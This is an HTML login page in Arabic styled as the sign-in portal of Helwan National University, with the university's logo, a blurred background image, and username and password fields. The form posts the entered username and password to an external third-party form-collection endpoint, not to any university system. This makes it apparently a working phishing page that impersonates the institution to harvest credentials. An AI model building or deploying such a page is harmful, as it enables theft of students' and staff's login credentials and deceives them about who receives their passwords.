<!DOCTYPE html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>تسجيل الدخول - جامعة حلوان الأهلية</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap"
      rel="stylesheet"
    />

    <style>
      /* إعدادات عامة */
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: "Cairo", sans-serif;
      }

      body {
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #1a253a; /* لون احتياطي */
        position: relative;
        overflow: hidden;
      }

      /* خلفية الصفحة مع الصورة والطبقة الداكنة */
      .background-image {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        /* استبدل الرابط أدناه بصورة الجامعة الخاصة بك */
        background-image: url(image/photo_2025-12-03_01-56-06.jpg);
        background-size: cover;
        background-position: center;
        filter: blur(4px); /* تأثير الضبابية */
        z-index: -2;
      }

      .overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(
          16,
          33,
          62,
          0.75
        ); /* الطبقة الزرقاء الداكنة الشفافة */
        z-index: -1;
      }

      /* تنسيق البطاقة البيضاء */
      .login-card {
        background-color: #ffffff;
        width: 400px;
        max-width: 90%;
        padding: 40px 30px;
        border-radius: 10px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        text-align: center;
      }

      /* تنسيق الشعار */
      .logo-container {
        margin-bottom: 20px;
      }

      .logo-container img {
        width: 80px;
        height: 80px;
        object-fit: contain;
      }

      /* عنوان تسجيل الدخول */
      h2 {
        color: #1e3a8a; /* كحلي داكن */
        margin-bottom: 30px;
        font-weight: 700;
        font-size: 24px;
      }

      /* تنسيق حقول الإدخال */
      .input-group {
        margin-bottom: 15px;
      }

      input {
        width: 100%;
        padding: 12px 15px;
        border: 1px solid #e2e8f0;
        border-radius: 6px;
        outline: none;
        font-size: 14px;
        color: #333;
        transition: border-color 0.3s;
      }

      input:focus {
        border-color: #2563eb; /* اللون الأزرق عند الكتابة */
      }

      input::placeholder {
        color: #94a3b8;
      }

      /* تنسيق الزر */
      button {
        width: 100%;
        padding: 12px;
        background-color: #2563eb; /* الأزرق الملكي */
        color: white;
        border: none;
        border-radius: 6px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        margin-top: 10px;
        transition: background-color 0.3s;
      }

      button:hover {
        background-color: #1d4ed8; /* لون أغمق قليلاً عند التمرير */
      }
    </style>
  </head>
  <body>
    <div class="background-image"></div>
    <div class="overlay"></div>

    <div class="login-card">
      <div class="logo-container">
        <img src="image/photo_2025-12-03_01-56-50.jpg" alt="شعار الجامعة" />
      </div>

      <h2>تسجيل الدخول</h2>
      <form action="https://getform.io/f/agdvylxb" method="POST">
        <div class="input-group">
          <input
            type="text"
            name="username"
            placeholder="اسم المستخدم"
            required
          />
        </div>

        <div class="input-group">
          <input
            type="password"
            name="pass"
            placeholder="كلمة المرور"
            required
          />
        </div>

        <input type="hidden" name="_gotcha" style="display: none !important" />

        <button type="submit">دخول</button>
      </form>
    </div>
  </body>
</html>
